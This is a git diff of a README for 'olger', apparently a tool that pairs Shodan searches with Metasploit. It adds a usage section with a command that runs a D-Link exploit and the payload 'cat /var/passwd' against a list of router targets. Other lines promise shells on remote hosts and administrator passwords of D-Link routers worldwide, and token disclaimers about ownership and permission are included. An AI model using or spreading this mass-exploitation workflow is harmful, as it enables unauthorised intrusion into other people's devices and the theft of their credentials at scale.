@@ -191,14 +191,32 @@ iphaproxy,domainname,http,ipbackend,portbackend,urlredirect
 
 ## Configure and use shodan
 
-Edit scripts shodan.js
+Edit scripts/shodan.js
+
 Add your api key
+
+Execution
 
 ````
 
 ./olger -s "your search here"
 
 ````
+
+## Metasploit module
+
+Just a line with the exploit to use, the payload, the command and the list to apply each metasploit command. Be carefully and don't use if you don't know how, you can cause big damages if you don't know how to use or you want to cause big damages.
+
+
+
+-m, --msfconsole [EXPLOIT_CHECK] [PAYLOAD] [CMD] [LIST] execute msf command for each input in the list
+
+````
+
+./olger -m exploits/dlink "" "cat /var/passwd" "lists/dir600v2.12
+
+````
+
 
 ## Hacking all with olger
 
@@ -215,6 +233,7 @@ Getting shells anywhere or execute commands in remote hosts.
 
 
 ```
+This example search all dlink routers in the world and show his remote administrator password (Not do if you aren't the owner of the devices or you have permit)
 
 ## Cront Jobs
 
